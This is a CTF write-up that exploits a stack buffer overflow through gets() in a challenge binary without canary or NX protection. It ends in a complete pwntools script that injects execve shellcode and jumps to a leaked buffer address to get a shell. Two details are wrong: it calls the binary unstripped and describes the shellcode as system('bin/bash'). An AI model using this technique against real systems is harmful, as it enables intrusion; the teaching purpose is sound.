---
title: 404 CTF Sans Protection
date: 2022-09-13 18:18:35
---
<center>

404 CTF Sans Protection Writeup

</center>

Before we start you need to download the binary from here : [Binary](https://drive.google.com/file/d/11CL4lsEt_YBYbp5uQU474CR9KLv6eYJn/view?usp=sharing).

Here we go let's start by running the binary and see what we have : 

````console
(ironbyte㉿IronByte)-[/mnt/c/Users/IR0NYTE/Desktop/ctf]
└─$ ./fragile
Montrez-nous de quoi vous êtes capable !
Cadeau : 0x7fff8ec7ec20
Asslema ya Hmema
````

As you can see the binary gave us some random memory address with a beautiful hello in *french*. Why don't we start by checking the architecture of the binary with the file command : 
```console
(ironbyte㉿IronByte)-[/mnt/c/Users/IR0NYTE/Desktop/ctf]
└─$ file fragile
```
We got : 

````bash
fragile: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a457609506482cdebb144dbacd9c1f6fba34955, stripped
````
As we can see the architecture of the binary is 64 bit, it's also dynamically linked and not striped. Let's try checking out the mitigations that is ON : 

````console
(ironbyte㉿IronByte)-[/mnt/c/Users/IR0NYTE/Desktop/ctf]
└─$ pwn checksec fragile
````

We got : 

````bash 
[*] '/mnt/c/Users/IR0NYTE/Desktop/ctf/fragile'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
````

So as you can see we have no stack canary protecting the stack from overriding the return of the program, we also have the right to execute code in the stack since the **NX** is disabled. Since this two mitagations are off i was curious a little of bit to know more about this random address that the binary was throwing at me so i fired up my ghidra and started making some analysis on it, i tried to decompile the main. Here's what i got : 


![](https://i.imgur.com/rlikp42.png)

After a quick look at the main, i noticed that there was a call to the **gets** function wich was a little of bit wired since the **gets** function have no limit on the size of the input which can lead to a buffer overflow attack. After that, i have noticed also that the address that the program was displaying was the address of the buffer. The idea is quite simple, we will try to inject a 64 bit shellcode in the beginning of the buffer from [Shell Storm](https://shell-storm.org/shellcode/) which will spawn for us a shell (*system("bin/bash")* Syscall), after that we will try to overflow the buffer until we get to the return address of the program then just redirect the return to the address of the buffer to execute our malicious shellcode. so we need to calculate the offset between the buffer and the return address. Let's fire up the gdb and set a break point after that **gets** call than i just typed in "mike" and then tried to calculate the offset from there :

````gdb
gef➤  search-pattern "mike"
[+] Searching 'mike' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6022a0 - 0x6022a6  →   "mike\n"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffe0f0 - 0x7fffffffe0f4  →   "mike"
gef➤  i f
Stack level 0, frame at 0x7fffffffe140:
 rip = 0x400662; saved rip = 0x7ffff7e0d7fd
 called by frame at 0x7fffffffe210
 Arglist at 0x7fffffffe0e8, args:
 Locals at 0x7fffffffe0e8, Previous frame's sp is 0x7fffffffe140
 Saved registers:
  rbp at 0x7fffffffe130, rip at 0x7fffffffe138
````
Offset = 0x7fffffffe138 - 0x7fffffffe0f0 = 0x48.

Here's the final exploit : 

````python
from pwn import *

#target = remote('challenge.404ctf.fr', 31720)
target = process('./fragile') 

# Setting up the leak
# 0x7ffe3c40e910
screen = target.recvline().decode()
leak = target.recvline().decode().strip("Cadeau :").strip("\n")
leak = bytes(leak, 'utf-8')
leak = int(leak, 16)

# Print the leak
print("Leak : ", hex(leak))

# Setting up the Payload
offset = 0x48
payload = b""
payload += b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
payload += b"A"*(offset - len(payload))
payload += p64(leak)

#gdb.attach(target, gdbscript='b* 00400668')
target.sendline(payload)
target.interactive()
````





